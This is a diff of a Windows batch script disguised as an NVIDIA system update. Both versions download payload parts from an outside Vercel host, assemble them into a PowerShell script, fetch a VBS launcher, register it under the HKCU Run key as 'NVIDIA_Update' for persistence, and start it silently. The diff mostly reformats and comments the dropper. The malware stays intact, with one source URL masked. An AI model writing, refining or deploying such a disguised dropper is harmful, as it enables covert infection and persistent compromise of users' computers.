@@ -1,35 +1,65 @@
 @echo off
 
-rmdir /s /q "%appdata%\nvidia_sys" 2>nul
+:: =============================================
+:: NVIDIA System Update Script (Cleaned Version)
+:: =============================================
 
-:: Set variables
-set "base=%appdata%\nvidia_sys\logs"
-set "t=%base%\nvs_update.txt"
-set "tempFile1=%base%\temp1.txt"
-set "tempFile2=%base%\secound.txt"
-set "ps1File=%base%\nvs_update.ps1"
-set "vbsFile=%base%\s-nvs_update.vbs"
+:: Clean up previous installation (if any)
+rmdir /s /q "%APPDATA%\nvidia_micro" 2>nul
 
-:: Create directory
-if not exist "%base%" mkdir "%base%"
+:: ======================
+:: Configure Paths
+:: ======================
+set "BASE_DIR=%APPDATA%\nvidia_micro\logs"
+set "MAIN_SCRIPT=%BASE_DIR%\nvs_update.txt"
+set "PART1_FILE=%BASE_DIR%\payload_part1.txt"
+set "PART2_FILE=%BASE_DIR%\payload_part2.txt"
+set "FINAL_PS1=%BASE_DIR%\NVS_UPDATE.PS1"
+set "LAUNCHER_VBS=%BASE_DIR%\s-nvs_update.vbs"
 
-:: Download required files
-powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/final.txt' -Destination '%t%'"
-powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/first.txt' -Destination '%tempFile1%'"
-powershell -Command "Start-BitsTransfer -Source **** -Destination '%tempFile2%'"
+:: ======================
+:: Create Working Directory
+:: ======================
+if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"
 
-:: Replace placeholders
-powershell -Command "(gc '%t%' -Raw) -replace '----', (gc '%tempFile1%' -Raw) -replace '====', (gc '%tempFile2%' -Raw) | Set-Content '%t%'"
+:: ======================
+:: Download Components
+:: ======================
+:: Download main script template
+powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/final.txt' -Destination '%MAIN_SCRIPT%'"
 
-:: Cleanup
-del "%tempFile1%" 2>nul
-del "%tempFile2%" 2>nul
+:: Download first payload part
+powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/first.txt' -Destination '%PART1_FILE%'"
 
+:: Download second payload part (URL redacted for security)
+powershell -Command "Start-BitsTransfer -Source **** -Destination '%PART2_FILE%'"
 
-:: Rename to .ps1
-ren "%t%" "NVS_UPDATE.PS1"
+:: ======================
+:: Assemble Final Script
+:: ======================
+:: Combine parts into final PowerShell script
+powershell -Command "(Get-Content '%MAIN_SCRIPT%' -Raw) -replace '----', (Get-Content '%PART1_FILE%' -Raw) -replace '====', (Get-Content '%PART2_FILE%' -Raw) | Set-Content '%MAIN_SCRIPT%'"
 
-:: Download and run VBS And Add To Statrtup
-powershell -Command "iwr https://service-omega-snowy.vercel.app/s-nvs_update.vbs -o '%vbsFile%'"
-powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NVIDIA_Update' -Value 'wscript.exe \"%APPDATA%\nvidia_sys\logs\s-nvs_update.vbs\"'"
-start /min wscript "%vbsFile%"
+:: ======================
+:: Cleanup Temp Files
+:: ======================
+del "%PART1_FILE%" 2>nul
+del "%PART2_FILE%" 2>nul
+
+:: ======================
+:: Finalize Script
+:: ======================
+:: Rename to proper PS1 extension
+ren "%MAIN_SCRIPT%" "NVS_UPDATE.PS1"
+
+:: ======================
+:: Install Persistence
+:: ======================
+:: Download VBS launcher
+powershell -Command "Invoke-WebRequest https://service-omega-snowy.vercel.app/s-nvs_update.vbs -OutFile '%LAUNCHER_VBS%'"
+
+:: Add to Windows startup
+powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NVIDIA_Update' -Value 'wscript.exe \"%LAUNCHER_VBS%\"'"
+
+:: Launch silently
+start /min wscript "%LAUNCHER_VBS%"
